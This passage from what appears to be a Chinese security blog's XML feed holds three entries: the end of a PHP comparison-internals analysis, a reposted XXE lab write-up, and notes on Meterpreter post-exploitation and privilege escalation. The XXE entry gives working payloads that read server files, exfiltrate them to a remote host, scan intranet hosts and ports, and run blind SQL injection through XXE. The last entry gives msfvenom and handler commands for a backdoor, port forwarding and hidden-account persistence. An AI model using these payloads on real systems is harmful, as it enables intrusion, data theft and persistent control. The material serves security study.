Z_LVAL_P(op1)&gt;Z_LVAL_P(op2)?1:(Z_LVAL_P(op1)&lt;Z_LVAL_P(op2)?-1:0)); return SUCCESS; 这里op1与op2都是IS_LONG类型PHP中一共如下八种数据类型，具体想了解可以点所以IS_LONG是一种PHP种的整型。 1ZVAL_LONG(result, Z_LVAL_P(op1)&gt;Z_LVAL_P(op2)?1:(Z_LVAL_P(op1)&lt;Z_LVAL_P(op2)?-1:0)); 这句的意思是进行比较OP1，OP2的大小分别返回-1，0，1到result，这里的result是有作用的，这里有一个ZVAL_BOOL函数进行判断，用于设置布尔值的zval ，ZVAL_BOOL就是定义这个zval的类型为bool。 1234#define ZVAL_BOOL(z, b) do &#123; \ Z_TYPE_INFO_P(z) = \ (b) ? IS_TRUE : IS_FALSE; \ &#125; while (0) 换成当前的场景result为z ，(Z_LVAL_P(result) &lt; 0)为bz 为用于设置布尔值的zvalb 为 设置的布尔值 这个函数 名是is_smaller_function具体意思已经很明显了 只有 Z_LVAL_P(result) &lt; 0，当result=-1（即op1&lt;op2的时候 result才为-1）才会使b=1 并且使得(b) ? IS_TRUE : IS_FALSE; 判断为IS_TRUE并使得Z_TYPE_INFO_P(result) 为IS_TRUE，最后就是根据Z_TYPE_INFO_P(result) 使IS_TRUE或者IS_FALSE来判断究竟是否小于 下一句 因为两个值是可以进行比较的它会return SUCCESS，我是这么理解的 如果有人看到这里，对于PHP究竟是如何判断大小应该有了基本的认识了吧回到我们最开始的问题那么我们就应该取寻找OP1与OP2分别为array类型与IS_LONG的case与OP1与OP2分别为array类型与array类型当然阅读这些case的时候又冒出了个问题这个又是什么意思呢？经过查询我们可以知道这句话来源于 1#define Z_ISREF(zval) (Z_TYPE(zval) == IS_REFERENCE) 其意思为该zval检查它是否是一个引用类型，姑且认为是判断这个变量是否属于PHP八种变量中的一种，那么IS_REFERENCE又是什么呢 此类型用于表示a zval是PHP引用。引用的值zval需要首先解除引用才能使用它。这可以使用ZVAL_DEREF或Z_REF宏来完成。zval可以检查A 以查看它是否是Z_ISREF宏的引用。 姑且认为这个意思是zaval确实是PHP引用的变量之一 那么整句话的我的理解是，当发生default:的时候假如OP1,OP2是PHP引用变量之一那么就继续接下来的几个case都不属于我们想要的情况直到 1234567891011121314151617181920212223242526272829303132333435363738if (!converted) &#123; if (Z_TYPE_P(op1) &lt; IS_TRUE) &#123; ZVAL_LONG(result, zval_is_true(op2) ? -1 : 0); return SUCCESS; &#125; else if (Z_TYPE_P(op1) == IS_TRUE) &#123; ZVAL_LONG(result, zval_is_true(op2) ? 0 : 1); return SUCCESS; &#125; else if (Z_TYPE_P(op2) &lt; IS_TRUE) &#123; ZVAL_LONG(result, zval_is_true(op1) ? 1 : 0); return SUCCESS; &#125; else if (Z_TYPE_P(op2) == IS_TRUE) &#123; ZVAL_LONG(result, zval_is_true(op1) ? 0 : -1); return SUCCESS; &#125; else &#123; op1 = zendi_convert_scalar_to_number(op1, &amp;op1_copy, result, 1); op2 = zendi_convert_scalar_to_number(op2, &amp;op2_copy, result, 1); if (EG(exception)) &#123; if (result != op1) &#123; ZVAL_UNDEF(result); &#125; return FAILURE; &#125; converted = 1; &#125; &#125; else if (Z_TYPE_P(op1)==IS_ARRAY) &#123; ZVAL_LONG(result, 1); return SUCCESS; &#125; else if (Z_TYPE_P(op2)==IS_ARRAY) &#123; ZVAL_LONG(result, -1); return SUCCESS; &#125; else &#123; ZEND_ASSERT(0); zend_throw_error(NULL, &quot;Unsupported operand types&quot;); if (result != op1) &#123; ZVAL_UNDEF(result); &#125; return FAILURE; &#125; 因为在函数的开头converted=0所以!converted=1是正确的，我们跟进这个判断发现这边只要op1为IS_ARRAY类型的变量就result直接就为1了这也解释了我们之前的问题为什么[]无论是比较1，0，-1都是返回true以及PHP手册中中的这个问题 当然我们依旧留存下一个问题为什么这个也是恒真的呢？可以清楚看到左右两边都是数组，我们需要找到arrary与arrary的这种case在最开始没几行就可以找到了这里有一个函数zend_compare_arrays我们跟进一下我们可以看到它返回了一个zend_compare_symbol_tables函数我们再跟进下当然在传入参数的时候又经历了Z_ARRVAL_P(a1)的变化Z_ARRVAL_P(a1)源自 #define Z_ARRVAL(zval) Z_ARR(zval) 大概的含义是从数组中抓取hash值，这里需要传入HashTable *ht1那么HashTable 又是什么呢？ 在学数据结构的时候我们都有学到hash，其实对于hashtable我之前的印象是比如python中的字典它的原理就是采取hash表，即采取键值对的方式进行查询数据，比起链表等方式查询无疑是要快的多 那么这里的hashtable又是否和我想的一样呢？具体看这里 PHP内核中的哈希表是十分重要的数据结构，PHP的大部分的语言特性都是基于哈希表实现的， 例如：变量的作用域、函数表、类的属性、方法等，Zend引擎内部的很多数据都是保存在哈希表中的。 PHP中的哈希表实现在Zend/zend_hash.c中，先看看PHP实现中的数据结构， PHP使用如下两个数据结构来实现哈希表，HashTable结构体用于保存整个哈希表需要的基本信息， 而Bucket结构体用于保存具体的数据内容，如下： 1234567891011121314151617typedef struct _hashtable &#123; uint nTableSize; // hash Bucket的大小，最小为8，以2x增长。 uint nTableMask; // nTableSize-1 ， 索引取值的优化 uint nNumOfElements; // hash Bucket中当前存在的元素个数，count()函数会直接返回此值 ulong nNextFreeElement; // 下一个数字索引的位置 Bucket *pInternalPointer; // 当前遍历的指针（foreach比for快的原因之一） Bucket *pListHead; // 存储数组头元素指针 Bucket *pListTail; // 存储数组尾元素指针 Bucket **arBuckets; // 存储hash数组 dtor_func_t pDestructor; // 在删除元素时执行的回调函数，用于资源的释放 zend_bool persistent; //指出了Bucket内存分配的方式。如果persisient为TRUE，则使用操作系统本身的内存分配函数为Bucket分配内存，否则使用PHP的内存分配函数。 unsigned char nApplyCount; // 标记当前hash Bucket被递归访问的次数（防止多次递归） zend_bool bApplyProtection;// 标记当前hash桶允许不允许多次访问，不允许时，最多只能递归3次#if ZEND_DEBUG int inconsistent;#endif&#125; HashTable; 当然如果要详细讲PHP中的hashtable讲清楚肯定要再写另一篇博客，这里我们就只讲这里所需要的原理这里进行两个参数的判断，当两个参数hash值相等时候就返回0我们可以直接看看php数组的hash，具体点这里这是在PHP5.6的数组结构我们可以看到，数组本质就是一个hashtable结构，左侧的0~nTablemask便是hash下标，而后面有一个双向链表，便是我们通常所说的hash冲突的链地址法。这是PHP7.0的数组结构Bucket结构便是我们所说的保存插入数据的结构。主要包括：key(字符串，如果是数字下标，转化位字符串), value, h(只会计算一次，如果是数组下标，直接把key作为h)。 稍稍回到原题，我们进行比较的就是Bucket结构中的hash值 那么hash值是怎么比较的呢？我们查找zend_hash_compare函数到底是什么意思 int zend_hash_compare( HashTable *ht1, HashTable *ht2, compare_func_t compar, zend_bool ordered TSRMLS_DC); 我们查询了hashtable的api具体想了解可以看这里这里有一句话 The return has the same meaning as compare_func_t. The function first compares the length of the arrays. If they differ, then the array with the larger length is considered greater. What happens when the length is the same depends on the ordered parameter:For ordered=0 (not taking order into account) the function will walk through the buckets of the first hashtable and always look up if the second hashtable has an element with the same key. If it doesn’t, then the first hashtable is considered greater. If it does, then the compar function is invoked on the values.For ordered=1 (taking order into account) both hashtables will be walked simultaneously. For each element first the key is compared and if it matches the value is compared using compar.This is continued until either one of the comparisons returns a non-zero value (in which case the result of the comparison will also be the result of zend_hash_compare()) or until no more elements are available. In the latter case the hashtables are considered equal. 解释一下这里先会判断这两个数组参数的长度。如果它们不同，则认为具有较大长度的阵列更大这也就能说明为什么我们前面的问题是恒真了吧 当然当长度相同比如[7],与[6]会遍历第一个数组，假如第一个数组的元素，并始终查找第二个哈希表是否具有相同键的元素。如果没有，那么第一个哈希表被认为更大，看到这里大家的疑惑都解决了吧 后记通过这次探寻，我深刻发现到往往很多我们认为是常识的东西都有着很多极其复杂的原理，我们认识一件事物的时候不能仅仅只凭借表面现象就根据自己直觉来得出结论，虽然有的时候得出的结果是一样的，但是我们并不能够真正理解这个结论到底为何而来。 转载本文由安全客原创发布转载，请参考转载声明，注明出处： https://www.anquanke.com/post/id/171966安全客 - 有思想的安全新媒体]]></content>
      <categories>
        <category>文章</category>
      </categories>
      <tags>
        <tag>PHP内核分析</tag>
        <tag>PHP弱类型</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[对于XXE漏洞的学习与实验复现记录（转载）]]></title>
    <url>%2F2019%2F02%2F26%2F%E5%AF%B9%E4%BA%8EXXE%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E9%AA%8C%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95%EF%BC%88%E8%BD%AC%E8%BD%BD%EF%BC%89%2F</url>
    <content type="text"><![CDATA[前言突然想研究下XXE漏洞,没有为什么，这篇作者写的挺好的，推荐可以同样学习一波。 正文知识点 https://xz.aliyun.com/t/3357#toc-5http://www.runoob.com/xml/xml-tutorial.html 实验实验来源,我只是复现学习一波 https://xz.aliyun.com/t/3357#toc-11 实验场所:Ubuntu 16.04.3 LTS nginx+php+mysql 实验一：有回显读本地敏感文件(Normal XXE)这个实验的攻击场景模拟的是在服务能接收并解析 XML 格式的输入并且有回显的时候，我们就能输入我们自定义的 XML 代码，通过引用外部实体的方法，引用服务器上面的文件本地服务器上放上解析 XML 的 php 代码：xml.php 12345678910&lt;?php libxml_disable_entity_loader (false); $xmlfile = file_get_contents(&apos;php://input&apos;); $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); echo $creds;?&gt; 我们在相同目录下放一个flag.php内容随意 payload 1234&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE creds [ &lt;!ENTITY goodies SYSTEM &quot;file:///var/www/html/test/flag.php&quot;&gt; ]&gt; &lt;creds&gt;&amp;goodies;&lt;/creds&gt; 但是因为这个文件没有什么特殊符号，于是我们读取的时候可以说是相当的顺利,但是假如换成以下内容呢？ 12345678910# /etc/fstab: static file system information.## Use &apos;blkid&apos; to print the universally unique identifier for a# device; this may be used with UUID= as a more robust way to name devices# that works even if disks are added and removed. See fstab(5).## &lt;file system&gt; &lt;mount point&gt; &lt;type&gt; &lt;options&gt; &lt;dump&gt; &lt;pass&gt;# / was on /dev/vda1 during installationUUID=e2048966-750b-4795-a9a2-7b477d6681bf / ext4 errors=remount-ro 0 1/dev/fd0 /media/floppy0 auto rw,user,noauto,exec,utf8 0 0 /etc/fstab 文件所表达的意义 https://blog.51cto.com/lspgyy/1297432 再次读取 可以看到，不但没有读到我们想要的文件，而且还给我们报了一堆错，怎么办？这个时候就要祭出我们的另一个神器了——CDATA ，简单的介绍如下(引用自转载大佬的一片介绍 XML 的博客)： 123456789101112有些内容可能不想让解析引擎解析执行，而是当做原始的内容处理，用于把整段数据解析为纯字符数据而不是标记的情况包含大量的 &lt;&gt; &amp; 或者&quot; 字符，CDATA节中的所有字符都会被当做元素字符数据的常量部分，而不是 xml标记&lt;![CDATA[XXXXXXXXXXXXXXXXX]]&gt;可以输入任意字符除了 ]]&gt; 不能嵌套用处是万一某个标签内容包含特殊字符或者不确定字符，我们可以用 CDATA包起来 那我们把我们的读出来的数据放在 CDATA 中输出就能进行绕过，但是怎么做到，我们来简答的分析一下： 首先，找到问题出现的地方，问题出现在 123...&lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt;&lt;creds&gt;&amp;goodies;&lt;/creds&gt; 引用并不接受可能会引起 xml 格式混乱的字符(在XML中，有时实体内包含了些字符，如&amp;,&lt;,&gt;,”,’等。这些均需要对其进行转义，否则会对XML解释器生成错误)，我们想在引用的两边加上 “&lt;![CDATA[“和 “]]&gt;”,但是好像没有任何语法告诉我们字符串能拼接的，于是我想到了能不能使用多个实体连续引用的方法那么要想在 DTD中拼接，我们知道我们只有一种选择，就是使用 参数实体payload: 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE roottag [&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt; &lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt; &lt;!ENTITY % end &quot;]]&gt;&quot;&gt; &lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; %dtd; ]&gt; &lt;roottag&gt;&amp;all;&lt;/roottag&gt; 成功读取 这里dtd引用时，需要查看下php.ini文件allow_url_fopen必须时on，因为这个off我试了半天不行新的问题出现但是，你想想也知道，本身人家服务器上的 XML 就不是输出用的，一般都是用于配置或者在某些极端情况下利用其他漏洞能恰好实例化解析 XML 的类，因此我们想要现实中利用这个漏洞就必须找到一个不依靠其回显的方法——外带 实验二：无回显读取本地敏感文件(Blind OOB XXE)xml.php 1234567&lt;?phplibxml_disable_entity_loader (false);$xmlfile = file_get_contents(&apos;php://input&apos;);$dom = new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); ?&gt; test.dtd 12&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY % send SYSTEM &apos;http://ip:9999?p=%file;&apos;&gt;&quot;&gt; payload： 1234&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;%remote;%int;%send;]&gt; (因为实体的值中不能有 %, 所以将其转成html实体编码 &#37;否则这里会有个错误）修改后我们清楚第看到服务器端接收到了我们用 base64 编码后的敏感文件信息(编码也是为了不破坏原本的XML语法)，不编码会报错。整个调用过程：我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 &#37;)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。新的思考：我们刚刚都只是做了一件事，那就是通过 file 协议读取本地文件，或者是通过 http 协议发出请求，熟悉 SSRF 的童鞋应该很快反应过来，这其实非常类似于 SSRF ，因为他们都能从服务器向另一台服务器发起请求，那么我们如果将远程服务器的地址换成某个内网的地址，（比如 192.168.0.10:8080）是不是也能实现 SSRF 同样的效果呢？没错，XXE 其实也是一种 SSRF 的攻击手法，因为 SSRF 其实只是一种攻击模式，利用这种攻击模式我们能使用很多的协议以及漏洞进行攻击。新的利用：所以要想更进一步的利用我们不能将眼光局限于 file 协议，我们必须清楚地知道在何种平台，我们能用何种协议如图所示:PHP在安装扩展以后还能支持的协议：如图所示：实验三：HTTP 内网主机探测我们以存在 XXE 漏洞的服务器为我们探测内网的支点。要进行内网探测我们还需要做一些准备工作，我们需要先利用 file 协议读取我们作为支点服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子（我以linux 为例），我们可以尝试读取 /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host 文件以后我们就有了大致的探测方向了下面是一个探测脚本的实例： 123456789101112131415161718192021222324252627282930313233import requestsimport base64#Origtional XML that the server accepts#&lt;xml&gt;# &lt;stuff&gt;user&lt;/stuff&gt;#&lt;/xml&gt;def build_xml(string): xml = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot; xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot; xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot; + &apos;&quot;&apos; + string + &apos;&quot;&apos; + &quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot; xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot; xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot; &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot; xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot; send_xml(xml)def send_xml(xml): headers = &#123;&apos;Content-Type&apos;: &apos;application/xml&apos;&#125; x = requests.post(&apos;http://34.200.157.128/CUSTOM/NEW_XEE.php&apos;, data=xml, headers=headers, timeout=5).text coded_string = x.split(&apos; &apos;)[-2] # a little split to get only the base64 encoded value print coded_string# print base64.b64decode(coded_string)for i in range(1, 255): try: i = str(i) ip = &apos;10.0.0.&apos; + i string = &apos;php://filter/convert.base64-encode/resource=http://&apos; + ip + &apos;/&apos; print string build_xml(string) except: continue 实验四：HTTP 内网主机端口扫描找到了内网的一台主机，想要知道攻击点在哪，我们还需要进行端口扫描，端口扫描的脚本主机探测几乎没有什么变化，只要把ip 地址固定，然后循环遍历端口就行了，当然一般我们端口是通过响应的时间的长短判断该该端口是否开放的，读者可以自行修改一下，当然除了这种方法，我们还能结合 burpsuite 进行端口探测比如我们传入： 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE data SYSTEM &quot;http://127.0.0.1:515/&quot; [ &lt;!ELEMENT data (#PCDATA)&gt; ]&gt;&lt;data&gt;4&lt;/data&gt; 返回结果： 12345javax.xml.bind.UnmarshalException - with linked exception:[Exception [EclipseLink-25004] (Eclipse Persistence Services): org.eclipse.persistence.exceptions.XMLMarshalExceptionException Description: An error occurred unmarshalling the document Internal Exception: ████████████████████████: Connection refused 实验五：内网盲注(CTF)2018 强网杯 有一道题就是利用 XXE 漏洞进行内网的 SQL 盲注的,大致的思路如下： 首先在外网的一台ip地址为 39.107.33.75:33899 的评论框处测试发现 XXE 漏洞，我们输入 xml 以及 dtd 会出现报错如图所示：既然如此，那么我们是不是能读取该服务器上面的文件，我们先读配置文件(这个点是 Blind XXE ，必须使用参数实体，外部引用 DTD ) /var/www/52dandan.cc/public_html/config.php 拿到第一部分 flag 123456&lt;?phpdefine(BASEDIR, &quot;/var/www/52dandan.club/&quot;);define(FLAG_SIG, 1);define(SECRETFILE,&apos;/var/www/52dandan.com/public_html/youwillneverknowthisfile_e2cd3614b63ccdcbfe7c8f07376fe431&apos;);....?&gt; 注意：这里有一个小技巧，当我们使用 libxml 读取文件内容的时候，文件不能过大，如果太大就会报错，于是我们就需要使用 php过滤器的一个压缩的方法压缩：echo file_get_contents(“php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd”);解压：echo file_get_contents(“php://filter/read=convert.base64-decode/zlib.inflate/resource=/tmp/1”); 然后我们考虑内网有没有东西，我们读取 /proc/net/arp/etc/host 找到内网的另一台服务器的 ip 地址 192.168.223.18 拿到这个 ip 我们考虑就要使用 XXE 进行端口扫描了，然后我们发现开放了 80 端口，然后我们再进行目录扫描，找到一个 test.php ，根据提示，这个页面的 shop 参数存在一个注入,但是因为本身这个就是一个 Blind XXE ,我们的对服务器的请求都是在我们的远程 DTD 中包含的，现在我们需要改变我们的请求，那我们就要在每一次修改请求的时候修改我们远程服务器的 DTD 文件，于是我们的脚本就要挂在我们的 VPS 上，一边边修改 DTD 一边向存在 XXE 漏洞的主机发送请求，脚本就像下面这个样子示例代码： 123456789101112131415161718192021222324252627282930import requestsurl = &apos;http://39.107.33.75:33899/common.php&apos;s = requests.Session()result = &apos;&apos;data = &#123; &quot;name&quot;:&quot;evil_man&quot;, &quot;email&quot;:&quot;testabcdefg@gmail.com&quot;, &quot;comment&quot;:&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE root [ &lt;!ENTITY % dtd SYSTEM &quot;http://evil_host/evil.dtd&quot;&gt; %dtd;]&gt; &quot;&quot;&quot;&#125;for i in range(0,28): for j in range(48,123): f = open(&apos;./evil.dtd&apos;,&apos;w&apos;) payload2 = &quot;&quot;&quot;&lt;!ENTITY % file SYSTEM &quot;php://filter/read=zlib.deflate/convert.base64-encode/resource=http://192.168.223.18/test.php?shop=3&apos;-(case%a0when((select%a0group_concat(total)%a0from%a0albert_shop)like%a0binary(&apos;&#123;&#125;&apos;))then(0)else(1)end)-&apos;1&quot;&gt; &lt;!ENTITY % all &quot;&lt;!ENTITY % send SYSTEM &apos;http://evil_host/?result=%file;&apos;&gt;&quot;&gt; %all; %send;&quot;&quot;&quot;.format(&apos;_&apos;*i+chr(j)+&apos;_&apos;*(27-i)) f.write(payload2) f.close() print &apos;test &#123;&#125;&apos;.format(chr(j)) r = s.post(url,data=data) if &quot;Oti3a3LeLPdkPkqKF84xs=&quot; in r.content and chr(j)!=&apos;_&apos;: result += chr(j) print chr(j) breakprint result 后记这篇真的学习到很多 参考 https://xz.aliyun.com/t/3357#toc-5https://xz.aliyun.com/t/122]]></content>
      <categories>
        <category>文章</category>
      </categories>
      <tags>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[后渗透阶段的Meterpreter与提权的学习与实验]]></title>
    <url>%2F2019%2F02%2F19%2F%E5%90%8E%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5%E7%9A%84Meterpreter%E4%B8%8E%E6%8F%90%E6%9D%83%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E9%AA%8C%2F</url>
    <content type="text"><![CDATA[前言提权，是黑客的专业名词，一般用于网站入侵和系统入侵。顾名思义，提权就是提高自己在服务器中的权限。大家都知道，当我们入侵了一台服务器并拿到了低权限shell时需要进行提权。本文就来讲解如何提权并判断哪些低权限的shell可以提升到高级权限。 正文提权前提1.已经拿到低权shell2.被入侵的机器上面有nc，python，perl等linux非常常见的工具3.有权限上传文件和下载文件 提权思路1.拿到低权限shell（如webshell/服务器低权限shell）2.搜索主机信息3.寻找exp4.尝试提权到高级别权限用户5.添加隐藏账户 环境准备靶机 Ubuntu 18.04.1 LTS攻击机 kali 提权过程连接靶机 使用低权限账户登录首先检验下昨天的学习我们使用Metasploit连接我们的靶机使用msfvenom生成shell脚本 为了防止之后出现”Module database cache not built yet, using slow search”提示首先要执行接下来三个命令 service postgresql start msfdb init msf &gt; db_rebuild_cache 补充：PostgreSQL 数据库端口号是5432 然后执行以下的命令 1msfvenom -p linux/x86/meterpreter/bind_tcp LHOST=192.168.65.128 LPORT=33333 -e x86/shikata_ga_nai -i 3 -f elf -o cool.elf 连接木马开启msf，启用exploit/multi/handler模块。 因为我两台都是虚拟机所以我们采取正向连接的方式 12345678msf &gt; use exploit/multi/handler msf exploit(handler) &gt; set payload linux/x86/meterpreter/bind_tcppayload =&gt; linux/x86/meterpreter/bind_tcpmsf exploit(handler) &gt; set RHOST 192.168.65.161RHOST =&gt; 192.168.65.161msf exploit(handler) &gt; set LPORT 33333LPORT =&gt; 33333explot 注意：这里set的payload跟生成木马使用的payload要一致，其余的参数根据选择的payload而填写。 在靶机执行脚本我们成功获取到shell Meterpreter 这部分主要参考 https://paper.seebug.org/29/ meterpreter介绍Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。meterpreter很强大,如果可以尽力使用 Meterpreter中常用的Shell1、reverse_tcp 这是一个基于TCP的反弹shell， 2、reverse_http 基于http方式的反向连接，在网速慢的情况下不稳定。 3、reverse_https 基于https方式的反向连接，在网速慢的情况下不稳定。 4、bind_tcp 这是一个基于TCP的正向连接shell，因为在内网跨网段时无法连接到attack的机器，所以在内网中经常会使用，不需要设置LHOST。 基本命令命令大全在meterpreter下面进行help： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586Core Commands============= Command Description ------- ----------- ? Help menu background Backgrounds the current session bgkill Kills a background meterpreter script bglist Lists running background scripts bgrun Executes a meterpreter script as a background thread channel Displays information or control active channels close Closes a channel disable_unicode_encoding Disables encoding of unicode strings enable_unicode_encoding Enables encoding of unicode strings exit Terminate the meterpreter session get_timeouts Get the current session timeout values help Help menu info Displays information about a Post module irb Drop into irb scripting mode load Load one or more meterpreter extensions machine_id Get the MSF ID of the machine attached to the session migrate Migrate the server to another process quit Terminate the meterpreter session read Reads data from a channel resource Run the commands stored in a file run Executes a meterpreter script or Post module set_timeouts Set the current session timeout values sleep Force Meterpreter to go quiet, then re-establish session. transport Change the current transport mechanism use Deprecated alias for &apos;load&apos; uuid Get the UUID for the current session write Writes data to a channelStdapi: File system Commands============================ Command Description ------- ----------- cat Read the contents of a file to the screen cd Change directory dir List files (alias for ls) download Download a file or directory edit Edit a file getlwd Print local working directory getwd Print working directory lcd Change local working directory lpwd Print local working directory ls List files mkdir Make directory mv Move source to destination pwd Print working directory rm Delete the specified file rmdir Remove directory upload Upload a file or directoryStdapi: Networking Commands=========================== Command Description ------- ----------- arp Display the host ARP cache ifconfig Display interfaces ipconfig Display interfaces netstat Display the network connections portfwd Forward a local port to a remote service route View and modify the routing tableStdapi: System Commands======================= Command Description ------- ----------- execute Execute a command getenv Get one or more environment variable values getpid Get the current process identifier getprivs Attempt to enable all privileges available to the current process getuid Get the user that the server is running as kill Terminate a process ps List running processes rev2self Calls RevertToSelf() on the remote machine shell Drop into a system command shell suspend Suspends or resumes a list of processes sysinfo Gets information about the remote system, such as OS 可以看到有很多命令工具可以使用，非常方便！ 基本命令 background：这个命令是将当前的session放到后台运行，可以在msf中继续其他渗透任务； sessions：这个命令需要配合上面的background使用，该命令是将后台的会话打开，进行会话操作。 可以使用sessions -i id 重新连接在后台的session会话 quit 退出会话 shell 获得控制台权限 irb 开启ruby终端文件系统命令 cat 查看文件内容 getwd 查看当前工作目录 upload 上传文件到目标机上 download 下载文件到本机上 edit 编辑文件 search 搜索文件网络命令 ipconfig / ifconfig 查看网络接口信息 portfwd add -l 4444 -p 3389 -r 192.168.1.102 端口转发，本机监听4444，把目标机3389转到本机4444 rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 然后使用rdesktop来连接，-u 用户名 -p 密码 route 获取路由表信息系统命令 ps 查看当前活跃进程 migrate pid 将Meterpreter会话移植到进程数位pid的进程中 migrate将进程转移至其他稳定进程中，实战用需要。 execute -H -i -f cmd.exe 创建新进程cmd.exe，-H不可见，-i交互 getpid 获取当前进程的pid kill pid 杀死进程 getuid 查看权限 sysinfo 查看目标机系统信息，如机器名，操作系统等 shutdown 关机后渗透攻击模块(windos) 这部分主要参考（包括维权） https://paper.seebug.org/29/ windows提权getsystem利用meterpreter中的getsystem命令，该命令自动寻找各种可能的适应技术，以便将用户权限提升到更高级别。默认值0会尝试所有列出技术来尝试提权，直至成功。提权方式采用命令管道模拟提升的方法和令牌复制的方法。该命令使用方便，并且简单高效，在渗透测试中会频繁使用到，建议所有提权过程中先行尝试此方法。 利用本地漏洞本地漏洞提权，即使用本地漏洞的利用程序（loca&gt;exploit）提升权限。就是说通过运行一些现成的造成溢出漏洞的exploit,把用户从users组或其它系统用户中提升到administrators组（或root）。溢出漏洞就像杯子里装水,水多了杯子装不进去,就会把里面的水溢出来。而相对计算机来说计算机有个地方叫缓存区,程序的缓存区长度是被事先设定好的,如果用户输入的数据超过了这个缓存区的长度,那么这个程序就会溢出了。 输入命令shell进入目标机CMD命令行，再利用systeminfo命令或者通过查询 c:\windows\ 里留下的补丁号.log来看看目标机大概打了哪些补丁。查看目标主机有无打补丁，我们可以尝试利用Windows下已有的漏洞提权，如ms13_053,ms14_058,ms16_016,ms16_032等等。 成功利用好这个进程后记得，使用migrate命令迁移到该进程中 剩余方法 传送门 linux提权 https://xz.aliyun.com/t/2512 搜索exp，上传 将提权脚本上传到服务器/tmp目录下 在服务器上运行检测脚本，可在输出结果中找到相关漏洞信息站点及攻击载荷 访问漏洞信息网站，查看漏洞信息，下载利用脚本 可以在这里搜索 http://www.exploit-db.com/ 或者使用Kali本地searchsploit（metasploit），寻找对应编号的exp,尝试提权 选择一个payload上传到服务器 在服务器上执行提权代码，发现编译失败，提示版本错误 检测靶机内核版本 执行脚本，寻找对应内核版本的exp, 访问网址，获取exp 更换exp,再次尝试 运行提权代码 不行就换不断尝试 参考 https://xz.aliyun.com/t/2853https://www.freebuf.com/articles/system/129549.htmlhttps://xz.aliyun.com/t/2862https://www.anquanke.com/post/id/87292https://xz.aliyun.com/search?page=1&amp;keyword=%E6%8F%90%E6%9D%83https://xz.aliyun.com/t/2512https://blog.csdn.net/freestyle4568world/article/details/54712901]]></content>
      <categories>
        <category>文章</category>
      </categories>
      <tags>
        <tag>Matesploit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[msf构造出shell反弹脚本]]></title>
    <url>%2F2019%2F02%2F18%2Fmsf%E6%9E%84%E9%80%A0%E5%87%BAshell%E5%8F%8D%E5%BC%B9%E8%84%9A%E6%9C%AC%2F</url>
